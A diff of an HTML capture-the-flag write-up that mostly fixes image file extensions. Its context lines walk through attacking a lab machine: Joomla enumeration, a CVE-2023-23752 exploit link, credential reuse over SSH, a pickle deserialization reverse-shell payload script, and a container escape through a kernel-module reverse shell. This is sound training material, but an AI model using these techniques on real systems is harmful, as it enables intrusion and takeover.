@@ -315,10 +315,10 @@ Nmap done: 1 IP address (1 host up) scanned in 42.25 seconds</div>
 http://10.67.166.123 [200 OK] Apache[2.4.58], Cookies[310c29008fc04f792e0bccb4682e5b78], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], HttpOnly[310c29008fc04f792e0bccb4682e5b78], IP[10.67.166.123], MetaGenerator[Joomla! - Open Source Content Management], PasswordField[password], Script[application/json,application/ld+json,module], Title[Home], UncommonHeaders[referrer-policy,cross-origin-opener-policy], X-Frame-Options[SAMEORIGIN]</div>
 
                 <p>now iam sure the website use joomla.<br>now i opened the website and show the source code but no thing interesting<br>i will use burp now and testing the main page that is login page<br>i do some config to make it easy<br><div class="img-container">
-                    <img src="images/voyage1" alt="Proof of Concept Image 3">
+                    <img src="images/voyage1.png" alt="Proof of Concept Image 3">
                 </div>
 				<div class="img-container">
-                    <img src="images/voyage2" alt="Proof of Concept Image 3">
+                    <img src="images/voyage2.png" alt="Proof of Concept Image 3">
                 </div><br>While i do it i notice some Enum is finished<br>and we have interesing directores and paths</p>
 
                 <div class="terminal-box">┌──(root㉿omar)-[/home/mesalam/Downloads]
@@ -373,9 +373,9 @@ http://10.67.166.123 [200 OK] Apache[2.4.58], Cookies[310c29008fc04f792e0bccb468
 /web.config.txt</div>
 
                 <p>Lets testing it<br>it redirect<br><code>/administrator/includes/</code><div class="img-container">
-                    <img src="images/voyage3" alt="Proof of Concept Image 3">
+                    <img src="images/voyage3.png" alt="Proof of Concept Image 3">
                 </div><br><br>The second find it was this —&gt; http://10.67.166.123/administrator/<br>it redirect me to admin page login<br><div class="img-container">
-                    <img src="images/voyage4" alt="Proof of Concept Image 4">
+                    <img src="images/voyage4.png" alt="Proof of Concept Image 4">
                 </div><br>Ohoo interesting finding again<br>http://10.67.166.123/htaccess.txt<br>I think it maybe include the version of joomla<br><br>It is will be useful too<br>http://10.67.166.123/robots.txt</p>
 
                 <div class="terminal-box">User-agent: *
@@ -411,7 +411,7 @@ Disallow: /plugins/
 Disallow: /tmp/</div>
 
                 <p>Now we finish the directories that we accessed from eum<br>but we dont know the version<br>I will do something i hope to be useful<br><div class="img-container">
-                    <img src="images/voyage5" alt="Proof of Concept Image 3">
+                    <img src="images/voyage5.png" alt="Proof of Concept Image 3">
                 </div><br>Some times i like Ai 😂<br>this path was include the version and it was Joomla 4.2.7 2023-01<br>I think it is very old .<br>Now i will install joomscan<br>its tool for joomla websites</p>
 
                 <div class="terminal-box">[+] Detecting Joomla Version
@@ -422,12 +422,12 @@ Disallow: /tmp/</div>
 <a href="https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT" target="_blank" style="color: var(--accent-green); text-decoration: none; font-family: var(--font-code);">
     https://github.com/K3ysTr0K3R/CVE-2023-23752-EXPLOIT
 </a><div class="img-container">
-                    <img src="images/voyage6" alt="Proof of Concept Image 3">
+                    <img src="images/voyage6.png" alt="Proof of Concept Image 3">
                 </div>
 <br><br>Now we obtain credentials but this cred doesnt work on port 22<br>but if try on 2222 it success RootPassword@1234<br>22 → failed<br><br>2222 → successful<br><div class="img-container">
-                    <img src="images/voyage7" alt="Proof of Concept Image 3">
+                    <img src="images/voyage7.png" alt="Proof of Concept Image 3">
                 </div><br>But i think iam on Docker container<br><div class="img-container">
-                    <img src="images/voyage8" alt="Proof of Concept Image 3">
+                    <img src="images/voyage8.png" alt="Proof of Concept Image 3">
                 </div><br>Now this Confirms that we are in docker</p>
 
                 <div class="terminal-box">root@f5eb774507f2:/# id
@@ -503,12 +503,12 @@ valid_lft forever preferred_lft forever</div>
                 </table>
 
                 <p>The interesting discovery it was it<br>192.168.100.12:5000<br>Werkzeug/3.1.3<br><br>Python/3.10.12<br>now we need discover it<br><code>curl -i http://192.168.100.12:5000/</code><br>it make us to know this port is<br>Flask login panel<br>accept post method on / path<br>the unexpected thing heppened that it was the website doesnt validate the credentials<br>The Flask application was only accessible from the internal network so I decided to use SSH local port forwarding to access it from my machine and inspect the requests through Burp Suite<br>i made it and login with test test<br><div class="img-container">
-                    <img src="images/voyage9" alt="Proof of Concept Image 3">
+                    <img src="images/voyage9.png" alt="Proof of Concept Image 3">
                 </div><br>then i think we need to show the req<br>we found it<br><code>session_data=80049525000000000000007d94288c0475736572948c0474657374948c077
 					26576656e7565948c05383530303094752e</code><br>ummm i think i will try to use Ai to analysis it<br><div class="img-container">
-                    <img src="images/voyage10" alt="Proof of Concept Image 3">
+                    <img src="images/voyage10.png" alt="Proof of Concept Image 3">
                 </div><br>Thats interesting<br>If we can prove that the application uses pickle.loads() to deserialize this cookie, I think we can potentially get RCE.<br>Now we prove it<br><div class="img-container">
-                    <img src="images/voyage11" alt="Proof of Concept Image 3">
+                    <img src="images/voyage11.png" alt="Proof of Concept Image 3">
                 </div><br>then i use this script to generate a payload for reverse shell</p>
 
                 <div class="code-box">import pickle
@@ -523,9 +523,9 @@ if __name__ == '__main__':
     print(binascii.hexlify(pickle.dumps(exploit())))</div>
 
                 <p>This generate a new cookie that have the payload inside<br>and i open shell to receive it<br><div class="img-container">
-                    <img src="images/voyage12" alt="Proof of Concept Image 3">
+                    <img src="images/voyage12.png" alt="Proof of Concept Image 3">
                 </div><br>that give me another shell But it put me in another Contain Docker<br><div class="img-container">
-                    <img src="images/voyage13" alt="Proof of Concept Image 3">
+                    <img src="images/voyage13.png" alt="Proof of Concept Image 3">
                 </div><br>I set up the connection like this</p>
 
                 <div class="terminal-box">script /dev/null -c bash
@@ -534,7 +534,7 @@ reset
 xterm</div>
 
                 <p>TTY / shell stabilization<br>Then i find the First Flag</p><div class="img-container">
-                    <img src="images/voyage4" alt="Proof of Concept Image 3">
+                    <img src="images/voyage14.png" alt="Proof of Concept Image 3">
                 </div>
 
                 <h2>3. Container Escape & Privilege Escalation ⚡</h2>
@@ -573,14 +573,14 @@ clean:
 	make -C $(KDIR) M=$(PWD) clean</div>
 
                 <p><code>make</code><br>now we have output rev.ko<br>I set up another listener on my machine and loaded the module.</p><div class="img-container">
-                    <img src="images/voyage16" alt="Proof of Concept Image 3">
+                    <img src="images/voyage16.png" alt="Proof of Concept Image 3">
                 </div>
 
                 <div class="conclusion-box">
                     <p style="margin: 0; color: var(--accent-green); font-weight: bold; font-family: var(--font-code);">Root Access Granted 🔥</p>
                     <p style="margin-top: 10px; color: #cbd5e1;">Now the module executed immediately giving me a reverse shell on the host machine.<br>Now I had successfully escaped the container and obtained root access</p>
                 </div><div class="img-container">
-                    <img src="images/voyage17" alt="Proof of Concept Image 3">
+                    <img src="images/voyage17.png" alt="Proof of Concept Image 3">
                 </div>
 
                 <p style="margin-top: 30px; font-weight: bold; font-family: var(--font-code); color: var(--accent-green);">Bye 👋</p>
